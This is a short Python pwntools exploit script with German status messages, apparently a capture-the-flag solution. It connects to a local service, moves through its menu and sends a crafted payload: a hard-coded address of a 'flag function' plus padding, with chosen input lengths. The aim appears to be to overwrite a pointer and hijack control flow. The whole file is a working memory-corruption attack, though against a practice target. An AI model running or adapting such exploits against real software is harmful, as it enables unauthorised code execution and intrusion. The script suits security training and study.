from pwn import *

TARGET_HOST = "localhost"
TARGET_PORT = 54321

LOCAL = False

print("Verbinden zu %s:%d..." % (TARGET_HOST, TARGET_PORT))
process = remote(TARGET_HOST, TARGET_PORT)

address_flag_function = p64(0x0000000000403d78)
padding = b'A'*40

print(process.recv())

print("Sende 3...")
payload =  b"3"
process.sendline(payload)
print(process.recv())

#print("Attaching debugger...")
#attach(process)

print("Sende 1...")
payload =  b"1"
process.sendline(payload)

print("Senden der Laenge des Inputs...")
payload =  b"49"
process.sendline(payload)

print("Senden der payload...")
payload =  address_flag_function + padding
process.sendline(payload)
print(process.recv())

print("Sende 1...")
payload =  b"1"
process.sendline(payload)

print("Senden der Laenge des Inputs...")
payload =  b"48"
process.sendline(payload)

print("Senden der payload...")
payload =  address_flag_function + padding
process.sendline(payload)
print(process.recv())
#print("Attaching debugger...")
#attach(process)

print("Sende 2...")
payload =  b"2"
process.sendline(payload)
print(process.recv())
